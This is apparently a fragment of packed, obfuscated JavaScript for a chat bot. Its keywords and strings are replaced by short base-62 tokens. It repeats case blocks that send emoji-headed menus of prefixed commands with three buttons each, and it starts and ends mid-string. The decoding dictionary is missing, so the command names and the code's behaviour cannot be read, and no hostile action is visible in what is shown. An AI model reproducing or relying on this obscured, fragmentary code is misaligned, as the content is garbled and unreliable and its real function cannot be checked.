${j}5V[D]🔖• ${j}sy[U]🔖• ${j}oH[z 4h]🔖• ${j}oG🔖• ${j}oJ🔖• ${j}oI[2m]🔖• ${j}fu[2X/8J]🔖• ${j}ft[2X/8J] ➡️oF🔖• ${j}Bx🔖• ${j}oE🔖• ${j}oD[aO]🔖• ${j}oC[U]🔖• ${j}oB[D]🔖• ${j}oA[D]🔖• ${j}1v🔖• ${j}oz🔖• ${j}dc[aO]🔖• ${j}oy[8J]🔖• ${j}fr[2f]🔖• ${j}bh[z/2X]🔖• ${j}ox[D]🔖• ${j}ow[D]🔖• ${j}fq[on/1A]🔖• ${j}ou[on/1A]🔖• ${j}ot[on/1A]🔖• ${j}oq[on/1A]🔖• ${j}op[on/1A]🔖• ${j}oo[on/1A]🔖• ${j}om[on/1A]🔖• ${j}ol[on/1A]🔖• ${j}oj[on/1A]🔖• ${j}da[on/1A]🔖• ${j}d9[on/1A]🔖• ${j}sw[on/1A]🔖• ${j}6a[on/1A]🔖• ${j}6a[on/1A]🔖• ${j}fp[z/2X]🔖• ${j}fo[z/2X]🔖• ${j}8I[z 2C]🔖• ${j}2E🔖• ${j}7q🔖• ${j}7V🔖• ${j}oi🔖• ${j}og🎨su🔖• ${j}d8🔖• ${j}ob🔖• ${j}fn🔖• ${j}fm🔖• ${j}d6🔖• ${j}d5🔖• ${j}fl🔖• ${j}d4🔖• ${j}d3🔖• ${j}d2🔖• ${j}bd🔖• ${j}bb🔖• ${j}6S🔖• ${j}d1🔖• ${j}fk🔖• ${j}d0🔖• ${j}a4🔖• ${j}8H🔖• ${j}ba🔖• ${j}b9🔖• ${j}b8🔖• ${j}a3🔖• ${j}a2🔖• ${j}fj🔖• ${j}a1🔖• ${j}oa??• ${j}cZ🔖• ${j}cY🔖• ${j}8E🔖• ${j}8F🔖• ${j}cX🔖• ${j}o9🔖• ${j}fh🔖• ${j}fg🔖• ${j}ff🔖• ${j}cW🔖• ${j}cV🔖• ${j}fe🔖• ${j}cU🔖• ${j}fd🔖• ${j}7U🔖• ${j}fc🔖• ${j}o8🔖• ${j}o7🔖• ${j}o6🔖• ${j}cT🔖• ${j}a0🔖• ${j}cS🔖• ${j}o5🔖• ${j}o4🔖• ${j}fb🔖• ${j}o3🔖• ${j}8G🔖• ${j}cR🔖• ${j}7p🔖• ${j}fa🔖• ${j}cQ🔖• ${j}5G🔖• ${j}7T🔖• ${j}o2🔖• ${j}f9🔖• ${j}o1🔖• ${j}cP🔖• ${j}o0🔖• ${j}nZ🔖• ${j}f8🔖• ${j}f7🔖• ${j}cO🔖• ${j}cN🔖• ${j}9Z🔖• ${j}9Y🔖• ${j}nY🔖• ${j}nX🔖• ${j}cM🔖• ${j}cL🔖• ${j}f6🔖• ${j}b7🔖• ${j}nW🔖• ${j}5s🔖• ${j}nV🔖• ${j}6u🔖• ${j}cK🔖• ${j}f5🔖• ${j}cJ🔖• ${j}nU🔖• ${j}f4🔖• ${j}f3🔖• ${j}f2🔖• ${j}nT🔖• ${j}cI🔖• ${j}f1🔖• ${j}8F🔖• ${j}nS🔖• ${j}b6🔖• ${j}9X🔖• ${j}9W🔖• ${j}f0🔖• ${j}cH🔖• ${j}cG🔖• ${j}nR🔖• ${j}6S🔖• ${j}8E🔖• ${j}cF⬇️sq🔖• ${j}6t[R]🔖• ${j}nQ[R]🔖• ${j}cE[R]🔖• ${j}b5[R|7o]🔖• ${j}b4[R|7o]🔖• ${j}eY[b3 1q]🔖• ${j}cD[R]🔖• ${j}cC[R]🔎eX🔖• ${j}5h[2A]🔖• ${j}5F[2A]🔖• ${j}8D[2A]🔖• ${j}9V[2A]🔖• ${j}8C[2A]🔖• ${j}eW[2A]🔖• ${j}6s[2A]🔖• ${j}U[2A]🔖• ${j}cB[2A]🔖• ${j}5r[2A]🔖• ${j}nP[2A]🔖• ${j}eV[2A]🔖• ${j}eU🔖• ${j}eT[2A]🔖• ${j}sn[2A]🔖• ${j}b1[2A]🔖• ${j}nO[2A]🔖• ${j}cA[2A]🔖• ${j}nM[2A]🔖• ${j}nL[ip|b0]♾️sl🔖• ${j}nK[z eR]🔖• ${j}2R[z 4h|eS]🔖• ${j}cz[z 4h|eS|sk]🔖• ${j}nJ[z 4h]🔖• ${j}2C[2C]🔖• ${j}nI[z 4h]🔖• ${j}nH[z eR]🔖• ${j}nG[z 4h]🔖• ${j}nF[z 3l]🔖• ${j}nE[z vn]🔖• ${j}nD[z sj]🔖• ${j}nC[z 6r]🔖• ${j}nB[z 6r]🔖• ${j}nA[1q]🔖• ${j}cy[D]🔖• ${j}9U[z 3l]🔖• ${j}eQ[z 3l]🔖• ${j}eP[z 3l]🔖• ${j}cx[z 3l]🔖• ${j}eO[z 3l]🔖• ${j}eN[z 3l]🔖• ${j}eM[z 3l]🔖• ${j}eL[z 3l]🔖• ${j}cw[z 3l]🔖• ${j}eK[z 3l]🔖• ${j}eJ[z 3l]🔖• ${j}nz[z 3l]🎈eH sd🔖• ${j}na[z 4h]🔖• ${j}n9[z 4h]🔖• ${j}eG[z 4h]🔖• ${j}n8[z 4h]🎠sh eH🔖• ${j}eI🔖• ${j}ny🔖• ${j}nx🔖• ${j}nw🔖• ${j}nv🔖• ${j}nu🔖• ${j}nt🔖• ${j}nr🔖• ${j}nq🔖• ${j}np[2A]🔖• ${j}nn[2A]🐣sf🔖• ${j}nl👨??‍💻• ${j}nk🔖• ${j}nj🔖• ${j}ni🔖• ${j}nh🔖• ${j}ng🔖• ${j}nf🔖• ${j}ne🔖• ${j}cv🔖• ${j}nd🔖• ${j}nc🔖• ${j}cv👾eD🔖• ${j}mZ🔖• ${j}mY🔖• ${j}mX🔖• ${j}mW🔖• ${j}mV🔖• ${j}mU🔖• ${j}mT🔖• ${j}mS🔖• ${j}mR🔖• ${j}mQ🔖• ${j}mP🔖• ${j}mO🔖• ${j}7R🔖• ${j}9T🔖• ${j}aY🔖• ${j}6R🔖• ${j}mN🔖• ${j}aX🔖• ${j}cu🔖• ${j}mM🔖• ${j}aW🔖• ${j}ct-6R🔖• ${j}mJ🔖• ${j}mL🔖• ${j}mK🔖• ${j}mI🔖• ${j}mH🔖• ${j}mG🔖• ${j}mF🔖• ${j}mE🔖• ${j}mD🔖• ${j}aY🔖• ${j}mC🔖• ${j}mB🔖• ${j}mA🔖• ${j}mz🔖• ${j}mx🔖• ${j}mw🔖• ${j}mv🔖• ${j}mt🔖• ${j}ms🔖• ${j}mr🔖• ${j}mq🔖• ${j}mp🔖• ${j}mo🔖• ${j}mn🔖• ${j}aX🔖• ${j}ml🔖• ${j}aV🔖• ${j}mk🔖• ${j}mj🔖• ${j}mi🔖• ${j}mh🔖• ${j}mg🔖• ${j}mb🔖• ${j}aW🔖• ${j}aV🔖• ${j}m9🧚🏻‍♂️eC🔖• ${j}m8🔖• ${j}2C🔖• ${j}m7🔖• ${j}m6🔖• ${j}eF🔖• ${j}m5🔖• ${j}m4🔖• ${j}eE🧚🏻‍♀️eD eC🔖• ${j}ct🔖• ${j}m0🔖• ${j}lZ🔖• ${j}eB🔖• ${j}lY🔖• ${j}lX🔖• ${j}eA🔖• ${j}lW🔖• ${j}lV🔖• ${j}lU🔖• ${j}lT🔖• ${j}lS🔖• ${j}lR🔖• ${j}lQ🔖• ${j}lP🔖• ${j}lO🔖• ${j}lN🔖• ${j}ez🔖• ${j}lM🔖• ${j}lL🔖• ${j}9S🔖• ${j}lK🔖• ${j}9R🔖• ${j}lJ🔖• ${j}lI🔖• ${j}9Q🔖• ${j}lH🔖• ${j}aS🔖• ${j}ey🕵🏻‍♂️s7🔖• ${j}lG🔖• ${j}cs🔖• ${j}lF🔖• ${j}lE🔖• ${j}ew🔖• ${j}lD🎭Bw🔖• ${j}9P[D🔖• ${j}aR[D]🔖• ${j}lB[D]🔖• ${j}is[D]🔖• ${j}5E[D]🔖• ${j}4t[D]🔖• ${j}lA[D]🔖• ${j}lz[2X]🔖• ${j}ly[2X]🔖• ${j}lx[2X]🔖• ${j}lw[2X]🔖• ${j}lv[2X]🔖• ${j}lt[2X]🔖• ${j}ls[2X]🔖• ${j}lr[2X]🔖• ${j}lq[2X]🔖• ${j}lp[2X]🔖• ${j}lo🔖• ${j}s5🔖• ${j}cr🔖• ${j}eu🔖• ${j}ln🔖• ${j}et🔖• ${j}lm🔖• ${j}ll🔖• ${j}lk🔖• ${j}lj🔖• ${j}cq🔖• ${j}li🔖• ${j}es🔖• ${j}lh🔖• ${j}er🔖• ${j}lg🔖• ${j}lf🔖• ${j}le🔖• ${j}ld🔖• ${j}eq🔖• ${j}ep🔖• ${j}lc🔖• ${j}lb🔖• ${j}la🔖• ${j}eo🔖• ${j}en🔖• ${j}l9🔖• ${j}l8🔖• ${j}l7🔖• ${j}l6🔖• ${j}l5🔖• ${j}l4🔖• ${j}l3🔖• ${j}l2🔖• ${j}l1🔖• ${j}l0🔖• ${j}kZ🔖• ${j}kY🔖• ${j}kX🔖• ${j}mf🔖• ${j}kW🔖• ${j}kV🔖• ${j}kU🔖• ${j}kT🔖• ${j}kS🔖• ${j}kR🎧Bv🔖• ${j}kv🔖• ${j}ku🔖• ${j}kt🔖• ${j}ks🔖• ${j}kr🔖• ${j}kq🔖• ${j}kp🔖• ${j}ko🔖• ${j}kn🔖• ${j}km🔖• ${j}kl🔖• ${j}kk🔖• ${j}kj🔖• ${j}ki🔖• ${j}kh🔖• ${j}kg🔖• ${j}kf??• ${j}kd🔖• ${j}kc🔖• ${j}kb🔖• ${j}ka🔖• ${j}k9🔖• ${j}k8🔖• ${j}k7🔖• ${j}k6🔖• ${j}k5🔖• ${j}k4🔖• ${j}k3🔖• ${j}k2🔖• ${j}k1🔖• ${j}k0🔖• ${j}jZ🔖• ${j}jY🔖• ${j}jX🔖• ${j}jW🔖• ${j}jV🔖• ${j}jU🔖• ${j}jT🔖• ${j}jS🔖• ${j}jR🔖• ${j}jQ🔖• ${j}jP🔖• ${j}jO🔖• ${j}jN🔖• ${j}jM🔖• ${j}jL🔖• ${j}jK🔖• ${j}jJ🔖• ${j}jI🔖• ${j}jH🔖• ${j}jG🔖• ${j}jF🔖• ${j}jE🔖• ${j}jD🔖• ${j}jC🔖• ${j}jB🔖• ${j}jA🔖• ${j}jz🔖• ${j}jy🔖• ${j}jx🔖• ${j}jw🔖• ${j}jv🔖• ${j}ju🔖• ${j}jt🔖• ${j}jr🔖• ${j}jq🔖• ${j}jp🔖• ${j}jo🔖• ${j}jn🔖• ${j}jm🔖• ${j}jl🔖• ${j}jk🔖• ${j}jj🔖• ${j}ji🔖• ${j}jh🔖• ${j}jg🔖• ${j}jf🔖• ${j}je🔖• ${j}jd🔖• ${j}jc🔖• ${j}jb🔖• ${j}ja🔖• ${j}j9🔖• ${j}j8🔖• ${j}j7🔖• ${j}j6🔖• ${j}j5🔖• ${j}j4🔖• ${j}j3🔖• ${j}j2🔖• ${j}j1🔖• ${j}j0🔖• ${j}iZ🔖• ${j}iY🔖• ${j}iX🔖• ${j}iW🔖• ${j}iV🔖• ${j}iU🔖• ${j}iT🔖• ${j}iS🔖• ${j}iR🔖• ${j}iQ🔖• ${j}iP🔖• ${j}iO🔖• ${j}iN🔖• ${j}iM🔖• ${j}iL🔖• ${j}iK🔖• ${j}iJ🔖• ${j}iI🔖• ${j}iH🔖• ${j}iG🔖• ${j}iF🔖• ${j}iE🔖• ${j}iD🔖• ${j}iC🔖• ${j}iB🔖• ${j}iA🔖• ${j}iz🔖• ${j}iy🔖• ${j}ix🔖• ${j}iw🔖• ${j}iv🔖• ${j}iu🔖• ${j}ir🔖• ${j}iq🔖• ${j}il🔖• ${j}ik🔖• ${j}ij🔖• ${j}ii🔖• ${j}ih🔖• ${j}ig🔖• ${j}ie🔖• ${j}ic🔖• ${j}ib🔖• ${j}ia🔖• ${j}i9🔖• ${j}i8🔖• ${j}i7🔖• ${j}i6🔖• ${j}i5🔖• ${j}i4🔖• ${j}i3🔖• ${j}i2🔖• ${j}i1🔖• ${j}i0🔖• ${j}hZ🔖• ${j}hY🔖• ${j}hX🔖• ${j}hW🔖• ${j}hV🔖• ${j}hU🔖• ${j}hT🔖• ${j}hS🔖• ${j}hR🔖• ${j}hQ🔖• ${j}hP🔖• ${j}hO🔖• ${j}hN🔖• ${j}hM🔖• ${j}hL🦄s2🔖• ${j}aP🔖• ${j}7Q🔖• ${j}9O🔖• ${j}kQ🔖• ${j}4V[aO]🔖• ${j}9N[kP]🔖• ${j}kO[2X]👤s0 oM🔖• ${j}3f🔖• ${j}6m🔖• ${j}9L🔖• ${j}aM📂kN🔖• ${j}kM🔖• ${j}kL🔖• ${j}kK🔖• ${j}kJ🔖• ${j}kI🔖• ${j}cn🔖• ${j}ek🔖• ${j}kH🥷🏻rX🔖• ${j}kF🔖• ${j}id🔖• ${j}kE[1q]🔖• ${j}cm🔖• ${j}rW[D]🔖• ${j}kD🔖• ${j}ej[D]]🔖• ${j}kz🔖• ${j}kC🔖• ${j}3S🔖• ${j}kB🔖• ${j}kA🔖• ${j}2j🔖• ${j}5D🔖• ${j}2y🔖• ${j}H🔖• ${j}ky🔖• ${j}kx🔖• ${j}3w🔖• ${j}8B🔖• ${j}ei[kw]`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sA\':{1m 2O=F 3i(4s+\'3q 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🥷🏻sz🔖• ${j}oL🔖• ${j}a5🔖• ${j}2t[1q]🔖• ${j}oK🔖• ${j}fv🔖• ${j}oJ🔖• ${j}oI[2m]🔖• ${j}fu[2f]🔖• ${j}ft[2f]🔖• ${j}5V[D]🔖• ${j}sy[U]🔖• ${j}oH[z 4h]🔖• ${j}oG`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sx\':{1m 2O=F 3i(4s+\'5H 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`➡️oF🔖• ${j}oE🔖• ${j}oD[aO]🔖• ${j}oC[U]🔖• ${j}oB[D]🔖• ${j}oA[D]🔖• ${j}1v🔖• ${j}Bu🔖• ${j}oz🔖• ${j}dc[aO]🔖• ${j}fr[2f]🔖• ${j}oy[8J]🔖• ${j}bh[z/2X]🔖• ${j}ox[D]🔖• ${j}ow[D]🔖• ${j}2T[on/1A]🔖• ${j}ov[on/1A]🔖• ${j}Bt[on/1A]🔖• ${j}fq[on/1A]🔖• ${j}ou[on/1A]🔖• ${j}ot[on/1A]🔖• ${j}oq[on/1A]🔖• ${j}op[on/1A]🔖• ${j}oo[on/1A]🔖• ${j}om[on/1A]🔖• ${j}ol[on/1A]🔖• ${j}oj[on/1A]🔖• ${j}da[on/1A]🔖• ${j}d9[on/1A]🔖• ${j}sw[on/1A]🔖• ${j}6a[on/1A]🔖• ${j}fp[z/2X]🔖• ${j}fo[z/2X]🔖• ${j}8I[z 2C]🔖• ${j}Bs[z 2f]🔖• ${j}2E🔖• ${j}7q🔖• ${j}7V🔖• ${j}oi🔖• ${j}og`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sv\':{1m 2O=F 3i(4s+\'od 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🎨su🔖• ${j}d8🔖• ${j}st🔖• ${j}d7🔖• ${j}f2🔖• ${j}oc🔖• ${j}ob🔖• ${j}fn🔖• ${j}fm🔖• ${j}d6🔖• ${j}d5🔖• ${j}fl🔖• ${j}d4🔖• ${j}d3🔖• ${j}d2🔖• ${j}bd🔖• ${j}bb🔖• ${j}6S🔖• ${j}d1🔖• ${j}fk🔖• ${j}d0🔖• ${j}a4🔖• ${j}8H🔖• ${j}ba🔖• ${j}b9🔖• ${j}b8🔖• ${j}a3🔖• ${j}a2🔖• ${j}fj🔖• ${j}a1🔖• ${j}oa🔖• ${j}cZ🔖• ${j}cY🔖• ${j}8E🔖• ${j}8F🔖• ${j}cX🔖• ${j}o9🔖• ${j}fh🔖• ${j}fg🔖• ${j}ff🔖• ${j}cW🔖• ${j}cV??• ${j}fe🔖• ${j}cU🔖• ${j}fd🔖• ${j}7U🔖• ${j}fc🔖• ${j}o8🔖• ${j}o7🔖• ${j}o6🔖• ${j}cT🔖• ${j}a0🔖• ${j}cS🔖• ${j}o5🔖• ${j}o4🔖• ${j}fb🔖• ${j}o3🔖• ${j}8G🔖• ${j}cR🔖• ${j}7p🔖• ${j}fa🔖• ${j}cQ🔖• ${j}5G🔖• ${j}7T🔖• ${j}o2🔖• ${j}f9🔖• ${j}o1🔖• ${j}cP🔖• ${j}o0🔖• ${j}nZ🔖• ${j}f8🔖• ${j}f7🔖• ${j}cO🔖• ${j}cN🔖• ${j}9Z🔖• ${j}9Y🔖• ${j}nY🔖• ${j}nX🔖• ${j}cM🔖• ${j}cL🔖• ${j}f6🔖• ${j}b7🔖• ${j}nW🔖• ${j}5s🔖• ${j}nV🔖• ${j}6u🔖• ${j}cK🔖• ${j}f5🔖• ${j}cJ🔖• ${j}nU🔖• ${j}f4🔖• ${j}f3🔖• ${j}f2🔖• ${j}nT🔖• ${j}cI🔖• ${j}f1🔖• ${j}8F🔖• ${j}nS🔖• ${j}b6🔖• ${j}9X🔖• ${j}9W🔖• ${j}f0🔖• ${j}cH🔖• ${j}cG🔖• ${j}nR🔖• ${j}6S🔖• ${j}8E🔖• ${j}cF`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sr\':{1m 2O=F 3i(4s+\'eZ 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`⬇️sq🔖• ${j}6t[R]🔖• ${j}nQ[R]🔖• ${j}cE[R]🔖• ${j}b5[R|7o]🔖• ${j}b4[R|7o]🔖• ${j}eY[b3 1q]🔖• ${j}cD[R]🔖• ${j}cC[R]`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sp\':{1m 2O=F 3i(4s+\'b2 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🔎eX🔖• ${j}5h[2A]🔖• ${j}5F[2A]🔖• ${j}8D[2A]🔖• ${j}9V[2A]🔖• ${j}8C[2A]🔖• ${j}eW[2A]🔖• ${j}6s[2A]🔖• ${j}U[2A]🔖• ${j}cB[2A]🔖• ${j}5r[2A]🔖• ${j}nP[2A]🔖• ${j}eV[2A]🔖• ${j}eU🔖• ${j}eT[2A]🔖• ${j}sn[2A]🔖• ${j}b1[2A]🔖• ${j}nO[2A]🔖• ${j}cA[2A]🔖• ${j}nM[2A]🔖• ${j}nL[ip|b0]`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sm\':{1m 2O=F 3i(4s+\'7S 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`♾️sl🔖• ${j}nK[z eR]🔖• ${j}2R[z 4h|eS]🔖• ${j}cz[z 4h|eS|sk]🔖• ${j}nJ[z 4h]🔖• ${j}2C[2C]🔖• ${j}nI[z 4h]🔖• ${j}nH[z eR]🔖• ${j}nG[z 4h]🔖• ${j}nF[z 3l]🔖• ${j}nE[z vn]🔖• ${j}nD[z sj]🔖• ${j}nC[z 6r]🔖• ${j}nB[z 6r]🔖• ${j}nA[1q]🔖• ${j}cy[D]🔖• ${j}9U[z 3l]🔖• ${j}eQ[z 3l]🔖• ${j}eP[z 3l]🔖• ${j}cx[z 3l]🔖• ${j}eO[z 3l]🔖• ${j}eN[z 3l]🔖• ${j}eM[z 3l]🔖• ${j}eL[z 3l]🔖• ${j}cw[z 3l]🔖• ${j}eK[z 3l]🔖• ${j}eJ[z 3l]🔖• ${j}nz[z 3l]`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'si\':{1m 2O=F 3i(4s+\'aZ 3x 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🎠sh eH🔖• ${j}eI🔖• ${j}ny🔖• ${j}nx🔖• ${j}nw🔖• ${j}nv🔖• ${j}nu🔖• ${j}nt🔖• ${j}nr🔖• ${j}nq🔖• ${j}np[2A]🔖• ${j}nn[2A]`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sg\':{1m 2O=F 3i(4s+\'nm 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🐣sf🔖• ${j}nl🔖• ${j}nk🔖• ${j}nj🔖• ${j}ni🔖• ${j}nh🔖• ${j}ng🔖• ${j}nf🔖• ${j}ne🔖• ${j}cv🔖• ${j}nd🔖• ${j}nc🔖• ${j}cv`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'se\':{1m 2O=F 3i(4s+\'3x nb 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🎈eH sd🔖• ${j}na[z 4h]🔖• ${j}n9[z 4h]🔖• ${j}eG[z 4h]🔖• ${j}n8[z 4h]`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'n0\':{1m 2O=F 3i(4s+\'aU 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`👾eD🔖• ${j}mZ🔖• ${j}mY🔖• ${j}mX🔖• ${j}mW🔖• ${j}mV🔖• ${j}mU🔖• ${j}mT🔖• ${j}mS🔖• ${j}mR🔖• ${j}mQ🔖• ${j}mP🔖• ${j}mO🔖• ${j}7R🔖• ${j}9T🔖• ${j}aY🔖• ${j}6R🔖• ${j}cu🔖• ${j}aX🔖• ${j}mN🔖• ${j}mM🔖• ${j}mL🔖• ${j}mK🔖• ${j}mJ🔖• ${j}mI🔖• ${j}mH🔖• ${j}mG🔖• ${j}mF🔖• ${j}mE🔖• ${j}mD🔖• ${j}aY🔖• ${j}mC🔖• ${j}mB🔖• ${j}mA🔖• ${j}mz🔖• ${j}mx🔖• ${j}mw🔖• ${j}mv🔖• ${j}mt🔖• ${j}ms🔖• ${j}mr🔖• ${j}mq🔖• ${j}mp👨??‍💻• ${j}mo🔖• ${j}mn🔖• ${j}aX🔖• ${j}ml🔖• ${j}aV🔖• ${j}mk🔖• ${j}mj🔖• ${j}mi🔖• ${j}mh🔖• ${j}mg🔖• ${j}mb🔖• ${j}aW🔖• ${j}aW🔖• ${j}aV🔖• ${j}ct-6R🔖• ${j}m9`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sb\':{1m 2O=F 3i(4s+\'aT 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🧚🏻‍♂️eC🔖• ${j}m8🔖• ${j}2C🔖• ${j}m7🔖• ${j}m6🔖• ${j}eF🔖• ${j}m5🔖• ${j}m4🔖• ${j}eE`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'sa\':{1m 2O=F 3i(4s+\'aU aT 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🧚🏻‍♀️eD eC🔖• ${j}ct🔖• ${j}m0🔖• ${j}lZ🔖• ${j}eB🔖• ${j}lY🔖• ${j}lX🔖• ${j}eA🔖• ${j}lW🔖• ${j}lV🔖• ${j}lU🔖• ${j}lT🔖• ${j}lS🔖• ${j}lR🔖• ${j}lQ🔖• ${j}lP🔖• ${j}lO🔖• ${j}lN🔖• ${j}ez🔖• ${j}lM🔖• ${j}lL🔖• ${j}9S🔖• ${j}lK🔖• ${j}9R🔖• ${j}lJ🔖• ${j}lI🔖• ${j}9Q🔖• ${j}lH🔖• ${j}aS🔖• ${j}ey`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'s9\':{1m 2O=F 3i(4s+\'s8 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🕵🏻‍♂️s7🔖• ${j}lG🔖• ${j}cs🔖• ${j}lF🔖• ${j}lE🔖• ${j}ew🔖• ${j}lD`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'s6\':{1m 2O=F 3i(4s+\'lC 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🎠🔖• ${j}9P[D🔖• ${j}aR[D]🔖• ${j}lB[D]🔖• ${j}is[D]🔖• ${j}5E[D]🔖• ${j}4t[D]🔖• ${j}lA[D]🔖• ${j}lz[2X]🔖• ${j}ly[2X]🔖• ${j}lx[2X]🔖• ${j}lw[2X]🔖• ${j}lv[2X]🔖• ${j}lt[2X]🔖• ${j}ls[2X]🔖• ${j}lr[2X]🔖• ${j}lq[2X]🔖• ${j}lp[2X]🔖• ${j}lo🔖• ${j}s5🔖• ${j}cr🔖• ${j}eu🔖• ${j}ln🔖• ${j}et🔖• ${j}lm🔖• ${j}ll🔖• ${j}lk🔖• ${j}lj🔖• ${j}cq🔖• ${j}li🔖• ${j}es🔖• ${j}lh🔖• ${j}er🔖• ${j}lg🔖• ${j}lf🔖• ${j}le🔖• ${j}ld🔖• ${j}eq🔖• ${j}ep🔖• ${j}lc🔖• ${j}lb🔖• ${j}la🔖• ${j}eo🔖• ${j}en🔖• ${j}l9🔖• ${j}l8🔖• ${j}l7🔖• ${j}l6🔖• ${j}l5🔖• ${j}l4🔖• ${j}l3🔖• ${j}l2🔖• ${j}l1🔖• ${j}l0🔖• ${j}kZ🔖• ${j}kY🔖• ${j}kX🔖• ${j}mf🔖• ${j}kW🔖• ${j}kV🔖• ${j}kU🔖• ${j}kT🔖• ${j}kS🔖• ${j}kR`,1J:`${1b}`,1c:1c,1G:4}1d 4q=F C.N(m.E,1R)}G l\'s4\':{1m 2O=F 3i(4s+\'em 2z\')1d 1c=[{1g:\'3S\',1e:{1f:\'4b 🔖”–\'},V:1},{1g:\'3w\',1e:{1f:\'4r 🔖\'},V:1},{1g:\'2j\',1e:{1f:\'3q 🔖\'},V:1}]1d 1R={U:2O,Y:`🎧em🔖• ${j}kv🔖• ${j}ku🔖• ${j}kt🔖• ${j}ks🔖• ${j}kr🔖• ${j}kq🔖• ${j}kp🔖• ${j}ko🔖• ${j}kn🔖• ${j}km🔖• ${j}kl🔖• ${j}kk🔖• ${j}kj🔖• ${j}ki🔖• ${j}kh🔖• ${j}kg🔖• ${j}kf🔖• ${j}kd🔖• ${j}kc🔖• ${j}kb🔖• ${j}ka🔖• ${j}k9🔖• ${j}k8🔖• ${j}k7🔖• ${j}k6🔖• ${j}k5🔖• ${j}k4🔖• ${j}k3🔖• ${j}k2🔖• ${j}k1🔖• ${j}k0🔖• ${j}jZ🔖• ${j}jY🔖• ${j}jX🔖• ${j}jW🔖• ${j}jV🔖• ${j}jU🔖• ${j}jT🔖• ${j}jS🔖• ${j}jR🔖• ${j}jQ🔖• ${j}jP🔖• ${j}jO🔖• ${j}jN🔖• ${j}jM🔖• ${j}jL🔖• ${j}jK🔖• ${j}jJ🔖• ${j}jI🔖• ${j}jH🔖• ${j}jG🔖• ${j}jF🔖• ${j}jE🔖• ${j}jD🔖• ${j}jC🔖• ${j}jB🔖• ${j}jA🔖• ${j}jz🔖• ${j}jy🔖• ${j}jx🔖• ${j}jw🔖• ${j}jv🔖• ${j}ju🔖• ${j}jt🔖• ${j}jr🔖• ${j}jq🔖• ${j}jp🔖• ${j}jo🔖• ${j}jn🔖• ${j}jm🔖• ${j}jl🔖• 